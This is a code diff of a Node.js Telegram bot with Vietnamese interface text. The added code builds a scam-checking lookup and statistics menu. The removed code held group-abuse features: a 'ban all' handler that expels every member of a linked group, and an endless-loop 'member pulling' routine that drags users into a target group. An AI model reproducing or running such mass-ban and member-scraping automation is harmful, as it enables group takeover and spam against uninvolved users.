+          `🎯 **Thông tin:** \`${result.key}\`\n` +
+          `❌ **Lý do:** ${result.reason}\n` +
+          `🔗 **Bằng chứng:** ${result.proof || 'Không có'}\n` +
+          `━━━━━━━━━━━━━━━━━━━━━\n` +
+          `🛑 **CẢNH BÁO:** KHÔNG GIAO DỊCH!`,
+          getMainMenu(isAdmin)
+        );
+
+        // Tự động gửi cảnh báo nếu phát hiện
+        await notifyScamAlert(result, 'Tra cứu Check Text');
+      } else {
+        return await ctx.replyWithMarkdown(
+          `✅ **CHƯA CÓ GHI NHẬN XẤU**\n` +
+          `━━━━━━━━━━━━━━━━━━━━━\n` +
+          `🔍 Từ khóa: \`${input}\`\n` +
+          `📌 Không có thông tin trong danh sách lừa đảo.`,
+          getMainMenu(isAdmin)
         );
       }
-      
-      if (!check.isAdmin) {
-        ctx.session.waitingForLink = false;
-        return ctx.reply(
-          `❌ **BOT CHƯA ĐƯỢC LÀM ADMIN**\n\n` +
-          `📌 **Group:** ${chatTitle}\n` +
-          `🔗 **Link:** ${text}\n\n` +
-          `📋 **Hướng dẫn:**\n` +
-          `1️⃣ Vào group → Quản lý nhóm\n` +
-          `2️⃣ Thêm bot @${(await bot.telegram.getMe()).username} làm ADMIN\n` +
-          `3️⃣ Gửi lại link group`
-        );
-      }
-      
-      const action = ctx.session.lastAction || 'pull';
-      console.log(`📋 Action: ${action} | Group: ${chatTitle}`);
-      
-      // ==================== BAN ALL ====================
-      if (action === 'ban') {
-        const memberCount = await bot.telegram.getChatMembersCount(chatId);
-        
-        await ctx.reply(
-          `🔨 **BAN ALL - ĐANG GIẾT**\n\n` +
-          `📌 **Group:** ${chatTitle}\n` +
-          `🔗 **Link:** ${text}\n` +
-          `👥 **Thành viên:** ${memberCount}\n\n` +
-          `☠️ Đang giết tất cả thành viên...`
-        );
-        
-        const result = await banAllMembers(chatId, ctx);
-        
-        if (result.success) {
-          await ctx.reply(
-            `✅ **BAN ALL HOÀN TẤT**\n` +
-            `━━━━━━━━━━━━━━━━━━━━━\n` +
-            `📌 **Group:** ${chatTitle}\n` +
-            `🔗 **Link:** ${result.link}\n` +
-            `💀 Đã ban: ${result.banned} người\n` +
-            `❌ Lỗi: ${result.failed}\n` +
-            `👥 Tổng: ${result.total}\n\n` +
-            `☠️ Không ai sống sót.`
-          );
-        } else {
-          await ctx.reply(`❌ **BAN ALL THẤT BẠI**\n\n${result.error}`);
-        }
-        
-        ctx.session.lastAction = null;
-        ctx.session.waitingForLink = false;
-        await ctx.reply('📋 Quay lại menu chính.', getAdminMenu());
-      }
-      
-      // ==================== KÉO MEM ====================
-      else if (action === 'pull') {
-        targetGroupId = chatId;
-        targetGroupLink = text;
-        
-        await ctx.reply(
-          `🚀 **KÉO MEM - BẮT ĐẦU**\n\n` +
-          `📌 **Group target:** ${chatTitle}\n` +
-          `🔗 **Link:** ${text}\n` +
-          `👥 **Thành viên:** ${await bot.telegram.getChatMembersCount(chatId)}\n\n` +
-          `📊 Đã kéo: ${pulledCount} người\n\n` +
-          `🔄 Đang chạy...`
-        );
-        
-        ctx.session.lastAction = null;
-        ctx.session.waitingForLink = false;
-        
-        pullActive = true;
-        
-        while (pullActive) {
-          await autoPull();
-          await new Promise(r => setTimeout(r, 25000));
-        }
-      }
-      
-    } catch (e) {
-      ctx.session.waitingForLink = false;
-      await ctx.reply(`❌ **LỖI XỬ LÝ LINK**\n\n${e.message}`);
     }
   }
 });
 
-// ==================== PULL OFF ====================
-bot.action('pull_off', async (ctx) => {
-  if (ctx.from.id !== ADMIN_ID) return ctx.answerCbQuery('❌ Mày là ai?');
-  if (!pullActive) return ctx.answerCbQuery('⚠️ Chưa kéo mà!');
-  
-  pullActive = false;
-  await ctx.answerCbQuery('🛑 ĐÃ DỪNG KÉO!');
-  await ctx.reply(
-    `⏸️ **DỪNG KÉO**\n\n` +
-    `📊 Đã kéo: ${pulledCount} người\n` +
-    `🎯 Target: ${targetGroupLink || 'Không có'}`,
-    getAdminMenu()
-  );
+// ==================== STATS ACTION ====================
+bot.action('menu_stats', async (ctx) => {
+  await ctx.answerCbQuery();
+  const msg = 
+    `📊 **THỐNG KÊ HỆ THỐNG QUÉT SCAM**\n` +
+    `━━━━━━━━━━━━━━━━━━━━━\n` +
+    `🔍 Lượt check Text: **${db.stats.scamSearches}**\n` +
+    `🖼️ Lượt quét Ảnh/QR: **${db.stats.imageScans}**\n` +
+    `🔗 Lượt check Group: **${db.stats.groupScans}**\n` +
+    `🔨 Lượt cấm thành công: **${db.stats.totalBanned}**\n` +
+    `👥 Người dùng đăng ký bot: **${db.users.length}**\n` +
+    `🚨 Dữ liệu Scammer: **${Object.keys(db.scamBlacklist).length}**\n` +
+    `━━━━━━━━━━━━━━━━━━━━━`;
+  await ctx.replyWithMarkdown(msg, getMainMenu(ctx.from.id === ADMIN_ID));
 });
 
-// ==================== DANH SÁCH GROUP ====================
-bot.action('list_groups', async (ctx) => {
-  if (ctx.from.id !== ADMIN_ID) return ctx.answerCbQuery('❌ Chỉ admin mới có quyền này!');
-  
-  await ctx.answerCbQuery('📋 Đang lấy danh sách...');
-  
-  const groups = await getBotGroups();
-  
-  if (groups.length === 0) {
-    return ctx.reply(
-      '❌ **KHÔNG TÌM THẤY GROUP NÀO**\n\n' +
-      'Bot chưa được thêm hoặc làm admin trong bất kỳ group nào.',
-      getAdminMenu()
-    );
-  }
-  
-  let msg = '📋 **DANH SÁCH GROUP**\n━━━━━━━━━━━━━━━━━━━━━\n\n';
-  for (let i = 0; i < groups.length; i++) {
-    const g = groups[i];
-    msg += `${i+1}. **${g.title}**\n`;
-    msg += `   👥 ${g.memberCount} thành viên\n`;
-    msg += `   🔗 ${g.link}\n\n`;
-  }
-  msg += `📌 **Tổng cộng:** ${groups.length} groups`;
-  
-  await ctx.reply(msg, getAdminMenu());
-});
-
-// ==================== STATUS ====================
-bot.action('status', async (ctx) => {
-  try {
-    const me = await ctx.telegram.getMe();
-    const groups = await getBotGroups();
-    const isAdmin = ctx.from.id === ADMIN_ID;
-    
-    await ctx.answerCbQuery('📊 Thống kê đây!');
-    await ctx.reply(
-      `📊 **OMEGA BOT STATUS**\n` +
-      `━━━━━━━━━━━━━━━━━━━━━\n` +
-      `🤖 Bot: ${me.first_name}\n` +
-      `🆔 ID: ${me.id}\n` +
-      `👥 Số group: ${groups.length}\n` +
-      `⚡ Kéo mem: ${pullActive ? '🟢 ĐANG KÉO' : '🔴 DỪNG'}\n` +
-      `📊 Đã kéo: ${pulledCount} người\n` +
-      `🎯 Target: ${targetGroupLink || 'Chưa có'}\n` +
-      `🛡️ Bảo vệ: @ongvuaphantich\n` +
-      `👑 Admin: ${ADMIN_ID}\n` +
-      `━━━━━━━━━━━━━━━━━━━━━\n` +
-      `*"Mày command. Tao execute."*`,
-      isAdmin ? getAdminMenu() : getUserMenu()
-    );
-  } catch (e) {
-    await ctx.reply(`❌ Lỗi: ${e.message}`);
-  }
-});
-
-// ==================== BACK MAIN ====================
-bot.action('back_main', async (ctx) => {
-  if (ctx.from.id !== ADMIN_ID) return ctx.answerCbQuery('❌ Mày là ai?');
-  
-  if (!ctx.session) ctx.session = { lastAction: null, targetGroup: null, waitingForLink: false };
-  
-  ctx.session.lastAction = null;
-  ctx.session.waitingForLink = false;
-  
-  await ctx.answerCbQuery('🔙 Quay lại menu');
-  await ctx.reply('📋 **QUAY LẠI MENU CHÍNH**', getAdminMenu());
-});
-
-// ==================== WEB SERVER ====================
+// ==================== SERVER LAUNCH ====================
 app.use(express.json());
+app.get('/', (req, res) => res.send('OMEGA BOT v900 MULTIMEDIA RUNNING'));
 
-app.get('/', (req, res) => {
-  res.send(`
-    <h1>🐱 OMEGA BOT</h1>
-    <p>🔥 Điều khiển từ DM — Qua link group</p>
-    <p>👑 Admin: ${ADMIN_ID}</p>
-    <p>📊 Đã kéo: ${pulledCount} người</p>
-    <p>⚡ Trạng thái: ${pullActive ? '🟢 ĐANG KÉO' : '🔴 DỪNG'}</p>
-    <p>🛡️ Bảo vệ: @ongvuaphantich</p>
-    <hr>
-    <p><i>Supreme Bot for Butter — 2026</i></p>
-  `);
-});
-
-// ==================== LAUNCH ====================
 const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`🚀 Server chạy trên Port ${PORT}`));
 
-app.listen(PORT, () => {
-  console.log(`✅ Web server chạy trên port ${PORT}`);
-  console.log(`🐱 OMEGA BOT ONLINE`);
-  console.log(`👑 Admin: ${ADMIN_ID}`);
-});
+bot.launch({ dropPendingUpdates: true })
+  .then(() => console.log('🤖 OMEGA BOT v900 MULTIMEDIA DETECTOR READY'))
+  .catch((err) => console.error('❌ Lỗi khởi động:', err));
 
-bot.launch({
-  dropPendingUpdates: true
-})
-.then(() => {
-  console.log('✅ OMEGA BOT đã khởi động thành công!');
-})
-.catch((err) => {
-  console.error('❌ Lỗi khởi động bot:', err);
-  process.exit(1);
-});
-
-setInterval(() => {
-  console.log('💓 OMEGA BOT vẫn đang sống...');
-}, 30000);
-
-process.once('SIGINT', () => {
-  console.log('🛑 Đang tắt bot...');
-  bot.stop('SIGINT');
-  process.exit(0);
-});
-
-process.once('SIGTERM', () => {
-  console.log('🛑 Đang tắt bot...');
-  bot.stop('SIGTERM');
-  process.exit(0);
-});
+process.once('SIGINT', () => bot.stop('SIGINT'));
+process.once('SIGTERM', () => bot.stop('SIGTERM'));
